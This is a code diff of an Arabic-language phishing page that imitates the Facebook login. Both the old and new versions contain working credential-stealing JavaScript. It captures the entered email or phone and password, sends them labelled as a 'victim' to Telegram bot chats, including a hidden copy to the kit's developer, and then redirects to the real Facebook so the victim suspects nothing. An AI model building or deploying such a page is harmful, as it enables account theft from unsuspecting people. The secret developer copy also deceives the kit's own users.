@@ -3,73 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - التسجيل أو تسجيل الدخول</title>
+    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        img.logo { width: 200px; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .fb-logo { width: 240px; margin-bottom: 20px; }
+        .login-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); width: 100%; max-width: 396px; text-align: center; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
         .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
-        .login-btn:hover { background-color: #166fe5; }
-        .footer-links { color: #1877f2; text-decoration: none; font-size: 14px; margin-top: 15px; display: block; }
-        .security-badge { margin-top: 20px; color: #8a8d91; font-size: 12px; display: flex; align-items: center; justify-content: center; }
-        .security-badge img { width: 14px; margin-right: 5px; }
+        .forgot { display: block; margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; padding: 12px; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 17px; display: inline-block; }
     </style>
 </head>
 <body>
-
-    <div class="login-box">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zpq_8V.svg" alt="Facebook" class="logo">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zpq_8V.svg" alt="Facebook" class="fb-logo">
+    <div class="login-card">
         <form id="loginForm">
-            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" id="pass" placeholder="كلمة السر" required>
             <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
-        <a href="#" class="footer-links">هل نسيت كلمة السر؟</a>
-        
-        <div class="security-badge">
-            <img src="https://img.icons8.com/material-rounded/24/8a8d91/lock.png" alt="lock">
-            اتصال آمن ومُشفر (SSL)
-        </div>
+        <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
+        <hr>
+        <a href="#" class="create-btn">إنشاء حساب جديد</a>
     </div>
 
     <script>
-        // 1. سحب المعطيات من الرابط تلقائياً (الديناميكي)
-        const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('user_id');   // الشخص اللي صنع الرابط
-        const adminId = urlParams.get('admin_id'); // أنت (Abu Osayed)
-        const botToken = urlParams.get('bot_token'); // التوكن الجديد
-
+        const p = new URLSearchParams(window.location.search);
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            // تجهيز رسالة الصيد
-            const message = `
-🔥 **New Facebook Victim!**
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-👤 **Email/Phone:** \`${email}\`
-🔑 **Password:** \`${pass}\`
-💻 **System:** M.Y.9 Security
-👑 **Dev:** 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-            `;
-
-            const finalMsg = encodeURIComponent(message);
-
-            // إرسال البيانات للمستخدم (اللي استخدم البوت)
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${finalMsg}&parse_mode=Markdown`);
-
-            // إرسال نسخة احتياطية إلك (المطور الأساسي)
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("⚠️ نسخة المطور (المراقبة):\n" + message)}&parse_mode=Markdown`)
-            .then(() => {
-                // تحويل الضحية للفيسبوك الحقيقي عشان ما يشك
-                window.location.href = "https://www.facebook.com/login/";
-            });
+            const msg = `🔥 **New FB Victim!**\n👤 **User:** \`${document.getElementById('user').value}\`\n🔑 **Pass:** \`${document.getElementById('pass').value}\`\n👑 **Dev:** Abu Osayed`;
+            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('user_id')}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('admin_id')}&text=${encodeURIComponent("⚠️ نسخة المراقبة:\n"+msg)}&parse_mode=Markdown`)
+            .then(() => location.href="https://facebook.com/login");
         });
     </script>
-
 </body>
 </html>
